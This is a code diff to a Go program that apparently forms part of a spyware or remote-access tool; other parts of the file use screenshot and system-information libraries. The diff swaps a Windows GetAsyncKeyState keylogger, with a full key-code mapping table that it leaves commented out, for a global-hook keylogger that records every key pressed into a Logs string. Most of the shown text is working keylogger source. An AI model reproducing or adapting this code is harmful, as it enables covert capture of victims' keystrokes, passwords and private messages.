@@ -12,6 +12,7 @@ import (
 	"strconv"
 	"syscall"
 	"time"
+	"fmt"
 
 	screenshot "github.com/kbinani/screenshot"
 	goInfo "github.com/matishsiao/goInfo"
@@ -29,7 +30,7 @@ var (
 	dll, _              = syscall.LoadDLL("user32.dll")
 	GetAsyncKeyState, _ = dll.FindProc("GetAsyncKeyState")
 	GetKeyState, _      = dll.FindProc("GetKeyState")
-	Logs                string
+	Logs               string  = ""
 )
 
 func main() {
@@ -273,215 +274,227 @@ func GetOSInformation() string {
 	return osInformation
 }
 
-// It is just a poor implementation of a keylogger written in golang
-func Keylogger() {
-	for {
-
-		time.Sleep(1 * time.Millisecond)
-
-		for i := 0; i < 256; i++ {
-			Result, _, _ := GetAsyncKeyState.Call(uintptr(i))
-
-			if Result&0x1 == 0 {
-				continue
-			}
-
-			switch i {
-			case 8:
-				Logs += "[Backspace]"
-			case 9:
-				Logs += "[Tab]"
-			case 13:
-				Logs += "[Enter]"
-			case 16:
-				Logs += "[Shift]"
-			case 17:
-				Logs += "[Control]"
-			case 18:
-				Logs += "[Alt]"
-			case 19:
-				Logs += "[Pause]"
-			case 27:
-				Logs += "[Esc]"
-			case 32:
-				Logs += " "
-			case 33:
-				Logs += "[PageUp]"
-			case 34:
-				Logs += "[PageDown]"
-			case 35:
-				Logs += "[End]"
-			case 36:
-				Logs += "[Home]"
-			case 37:
-				Logs += "[Left]"
-			case 38:
-				Logs += "[Up]"
-			case 39:
-				Logs += "[Right]"
-			case 40:
-				Logs += "[Down]"
-			case 44:
-				Logs += "[PrintScreen]"
-			case 45:
-				Logs += "[Insert]"
-			case 46:
-				Logs += "[Delete]"
-			case 48:
-				Logs += "[0)]"
-			case 49:
-				Logs += "[1!]"
-			case 50:
-				Logs += "[2@]"
-			case 51:
-				Logs += "[3#]"
-			case 52:
-				Logs += "[4$]"
-			case 53:
-				Logs += "[5%]"
-			case 54:
-				Logs += "[6¨]"
-			case 55:
-				Logs += "[7&]"
-			case 56:
-				Logs += "[8*]"
-			case 57:
-				Logs += "[9(]"
-			case 65:
-				Logs += "A"
-			case 66:
-				Logs += "B"
-			case 67:
-				Logs += "C"
-			case 186:
-				Logs += "Ç"
-			case 68:
-				Logs += "D"
-			case 69:
-				Logs += "E"
-			case 70:
-				Logs += "F"
-			case 71:
-				Logs += "G"
-			case 72:
-				Logs += "H"
-			case 73:
-				Logs += "I"
-			case 74:
-				Logs += "J"
-			case 75:
-				Logs += "K"
-			case 76:
-				Logs += "L"
-			case 77:
-				Logs += "M"
-			case 78:
-				Logs += "N"
-			case 79:
-				Logs += "O"
-			case 80:
-				Logs += "P"
-			case 81:
-				Logs += "Q"
-			case 82:
-				Logs += "R"
-			case 83:
-				Logs += "S"
-			case 84:
-				Logs += "T"
-			case 85:
-				Logs += "U"
-			case 86:
-				Logs += "V"
-			case 87:
-				Logs += "W"
-			case 88:
-				Logs += "X"
-			case 89:
-				Logs += "Y"
-			case 90:
-				Logs += "Z"
-			case 96:
-				Logs += "0"
-			case 97:
-				Logs += "1"
-			case 98:
-				Logs += "2"
-			case 99:
-				Logs += "3"
-			case 100:
-				Logs += "4"
-			case 101:
-				Logs += "5"
-			case 102:
-				Logs += "6"
-			case 103:
-				Logs += "7"
-			case 104:
-				Logs += "8"
-			case 105:
-				Logs += "9"
-			case 106:
-				Logs += "*"
-			case 107:
-				Logs += "+"
-			case 109:
-				Logs += "-"
-			case 110:
-				Logs += ","
-			case 111:
-				Logs += "/"
-			case 112:
-				Logs += "[F1]"
-			case 113:
-				Logs += "[F2]"
-			case 114:
-				Logs += "[F3]"
-			case 115:
-				Logs += "[F4]"
-			case 116:
-				Logs += "[F5]"
-			case 117:
-				Logs += "[F6]"
-			case 118:
-				Logs += "[F7]"
-			case 119:
-				Logs += "[F8]"
-			case 120:
-				Logs += "[F9]"
-			case 121:
-				Logs += "[F10]"
-			case 122:
-				Logs += "[F11]"
-			case 123:
-				Logs += "[F12]"
-			case 91:
-				Logs += "[Super]"
-			case 93:
-				Logs += "[Menu]"
-			case 144:
-				Logs += "[NumLock]"
-			case 189:
-				Logs += "[-_]"
-			case 187:
-				Logs += "[=+]"
-			case 188:
-				Logs += "[,<]"
-			case 190:
-				Logs += "[.>]"
-			case 191:
-				Logs += "[;:]"
-			case 192:
-				Logs += "['\"]"
-			case 193:
-				Logs += "[/?]"
-			case 221:
-				Logs += "[[{]"
-			case 220:
-				Logs += "[]}]"
-			case 226:
-				Logs += "[\\|]"
-			}
+func Keylogger(){
+	EvChan := hook.Start()
+	defer hook.End()
+	
+	for ev := range EvChan {
+		// fmt.Println(ev)
+		switch ev.Kind{
+		case hook.KeyDown:
+			Logs = fmt.Sprintf("%s%c",Logs,ev.Keychar)
 		}
 	}
 }
+// // It is just a poor implementation of a keylogger written in golang
+// func Keylogger() {
+// 	for {
+
+// 		time.Sleep(1 * time.Millisecond)
+
+// 		for i := 0; i < 256; i++ {
+// 			Result, _, _ := GetAsyncKeyState.Call(uintptr(i))
+
+// 			if Result&0x1 == 0 {
+// 				continue
+// 			}
+
+// 			switch i {
+// 			case 8:
+// 				Logs += "[Backspace]"
+// 			case 9:
+// 				Logs += "[Tab]"
+// 			case 13:
+// 				Logs += "[Enter]"
+// 			case 16:
+// 				Logs += "[Shift]"
+// 			case 17:
+// 				Logs += "[Control]"
+// 			case 18:
+// 				Logs += "[Alt]"
+// 			case 19:
+// 				Logs += "[Pause]"
+// 			case 27:
+// 				Logs += "[Esc]"
+// 			case 32:
+// 				Logs += " "
+// 			case 33:
+// 				Logs += "[PageUp]"
+// 			case 34:
+// 				Logs += "[PageDown]"
+// 			case 35:
+// 				Logs += "[End]"
+// 			case 36:
+// 				Logs += "[Home]"
+// 			case 37:
+// 				Logs += "[Left]"
+// 			case 38:
+// 				Logs += "[Up]"
+// 			case 39:
+// 				Logs += "[Right]"
+// 			case 40:
+// 				Logs += "[Down]"
+// 			case 44:
+// 				Logs += "[PrintScreen]"
+// 			case 45:
+// 				Logs += "[Insert]"
+// 			case 46:
+// 				Logs += "[Delete]"
+// 			case 48:
+// 				Logs += "[0)]"
+// 			case 49:
+// 				Logs += "[1!]"
+// 			case 50:
+// 				Logs += "[2@]"
+// 			case 51:
+// 				Logs += "[3#]"
+// 			case 52:
+// 				Logs += "[4$]"
+// 			case 53:
+// 				Logs += "[5%]"
+// 			case 54:
+// 				Logs += "[6¨]"
+// 			case 55:
+// 				Logs += "[7&]"
+// 			case 56:
+// 				Logs += "[8*]"
+// 			case 57:
+// 				Logs += "[9(]"
+// 			case 65:
+// 				Logs += "A"
+// 			case 66:
+// 				Logs += "B"
+// 			case 67:
+// 				Logs += "C"
+// 			case 186:
+// 				Logs += "Ç"
+// 			case 68:
+// 				Logs += "D"
+// 			case 69:
+// 				Logs += "E"
+// 			case 70:
+// 				Logs += "F"
+// 			case 71:
+// 				Logs += "G"
+// 			case 72:
+// 				Logs += "H"
+// 			case 73:
+// 				Logs += "I"
+// 			case 74:
+// 				Logs += "J"
+// 			case 75:
+// 				Logs += "K"
+// 			case 76:
+// 				Logs += "L"
+// 			case 77:
+// 				Logs += "M"
+// 			case 78:
+// 				Logs += "N"
+// 			case 79:
+// 				Logs += "O"
+// 			case 80:
+// 				Logs += "P"
+// 			case 81:
+// 				Logs += "Q"
+// 			case 82:
+// 				Logs += "R"
+// 			case 83:
+// 				Logs += "S"
+// 			case 84:
+// 				Logs += "T"
+// 			case 85:
+// 				Logs += "U"
+// 			case 86:
+// 				Logs += "V"
+// 			case 87:
+// 				Logs += "W"
+// 			case 88:
+// 				Logs += "X"
+// 			case 89:
+// 				Logs += "Y"
+// 			case 90:
+// 				Logs += "Z"
+// 			case 96:
+// 				Logs += "0"
+// 			case 97:
+// 				Logs += "1"
+// 			case 98:
+// 				Logs += "2"
+// 			case 99:
+// 				Logs += "3"
+// 			case 100:
+// 				Logs += "4"
+// 			case 101:
+// 				Logs += "5"
+// 			case 102:
+// 				Logs += "6"
+// 			case 103:
+// 				Logs += "7"
+// 			case 104:
+// 				Logs += "8"
+// 			case 105:
+// 				Logs += "9"
+// 			case 106:
+// 				Logs += "*"
+// 			case 107:
+// 				Logs += "+"
+// 			case 109:
+// 				Logs += "-"
+// 			case 110:
+// 				Logs += ","
+// 			case 111:
+// 				Logs += "/"
+// 			case 112:
+// 				Logs += "[F1]"
+// 			case 113:
+// 				Logs += "[F2]"
+// 			case 114:
+// 				Logs += "[F3]"
+// 			case 115:
+// 				Logs += "[F4]"
+// 			case 116:
+// 				Logs += "[F5]"
+// 			case 117:
+// 				Logs += "[F6]"
+// 			case 118:
+// 				Logs += "[F7]"
+// 			case 119:
+// 				Logs += "[F8]"
+// 			case 120:
+// 				Logs += "[F9]"
+// 			case 121:
+// 				Logs += "[F10]"
+// 			case 122:
+// 				Logs += "[F11]"
+// 			case 123:
+// 				Logs += "[F12]"
+// 			case 91:
+// 				Logs += "[Super]"
+// 			case 93:
+// 				Logs += "[Menu]"
+// 			case 144:
+// 				Logs += "[NumLock]"
+// 			case 189:
+// 				Logs += "[-_]"
+// 			case 187:
+// 				Logs += "[=+]"
+// 			case 188:
+// 				Logs += "[,<]"
+// 			case 190:
+// 				Logs += "[.>]"
+// 			case 191:
+// 				Logs += "[;:]"
+// 			case 192:
+// 				Logs += "['\"]"
+// 			case 193:
+// 				Logs += "[/?]"
+// 			case 221:
+// 				Logs += "[[{]"
+// 			case 220:
+// 				Logs += "[]}]"
+// 			case 226:
+// 				Logs += "[\\|]"
+// 			}
+// 		}
+// 	}
+// }
